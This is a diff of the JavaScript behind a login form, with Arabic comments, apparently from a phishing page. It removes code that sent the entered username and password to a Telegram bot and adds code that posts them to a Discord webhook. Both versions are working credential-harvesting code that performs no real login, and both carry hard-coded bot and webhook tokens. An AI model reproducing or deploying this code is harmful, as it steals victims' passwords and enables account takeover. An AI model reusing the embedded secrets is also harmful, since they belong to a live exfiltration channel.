@@ -1,36 +1,39 @@
-document.addEventListener("DOMContentLoaded", function () {
-    document.getElementById("loginButton").addEventListener("click", function (event) {
-        event.preventDefault(); // منع الانتقال لصفحة أخرى عند الضغط على الزر
+document.getElementById("loginButton").addEventListener("click", function(event) {
+    event.preventDefault(); // Prevent default form submission
 
-        var username = document.getElementById("username").value;
-        var password = document.getElementById("password").value;
+    // الحصول على قيم المدخلات
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
 
-        if (username === "" || password === "") {
-            alert("الرجاء إدخال اسم المستخدم وكلمة المرور.");
-            return;
-        }
+    // تأكد من أن المدخلات ليست فارغة
+    if (username && password) {
+        // البيانات التي سيتم إرسالها إلى ديسكورد
+        const data = {
+            content: New login attempt:\n**Username:** ${username}\n**Password:** ${password}
+        };
 
-        var botToken = "7664974744:AAG0ueJAEKAs7d8e2Yr48MifjmEBm093bV8"; // ضع توكن البوت الخاص بك هنا
-        var chatId = "7643313499"; // ضع الـ Chat ID الخاص بك
+        // عنوان Webhook الخاص بك
+        const webhookUrl = "https://discord.com/api/webhooks/1345817740761628702/-MdL4BrEenT9JtuMpg3LvU4bCHXUDcExH8N-E8CgNtVuEiIzEMCDEqFvZVdst7mszQQK";
 
-        var message = "🔐 محاولة تسجيل دخول:\n\n"
-            + "👤 المستخدم: " + username + "\n"
-            + "🔑 كلمة المرور: " + password;
-
-        var url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
-
-        fetch(url)
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert("تم إرسال البيانات ✅");
-                } else {
-                    alert("حدث خطأ ❌");
-                }
-            })
-            .catch(error => {
-                alert("فشل الإرسال 🚨");
-                console.error(error);
-            });
-    });
+        // إرسال البيانات باستخدام fetch (AJAX)
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log("Data sent to Discord successfully.");
+            } else {
+                console.log("Error sending data to Discord.");
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+        });
+    } else {
+        alert("Please fill in both fields.");
+    }
 });
